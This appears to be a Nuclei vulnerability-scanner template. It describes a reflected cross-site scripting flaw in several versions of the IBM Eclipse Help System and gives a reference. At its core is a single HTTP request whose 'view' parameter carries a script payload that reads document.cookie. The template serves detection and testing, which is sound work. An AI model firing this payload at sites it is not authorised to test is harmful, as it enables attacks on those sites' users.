# Nuclei Template: IBM Eclipse Help System - Cross-Site Scripting
**Template ID:** eclipse-help-system-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** High
**CWE:** CWE-80
**Source:** Nuclei Template (`eclipse-help-system-xss.yaml`)

## Vulnerability Information & PoC

## Description
IBM Eclipse Help System 6.1.0 through 6.1.0.6, 6.1.5 through 6.1.5.3, 7.0 through 7.0.0.2, and 8.0 prior to 8.0.0.1 contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

## References
- https://packetstormsecurity.com/files/131924/IBM-Eclipse-Help-System-IEHS-Cross-Site-Scripting.html
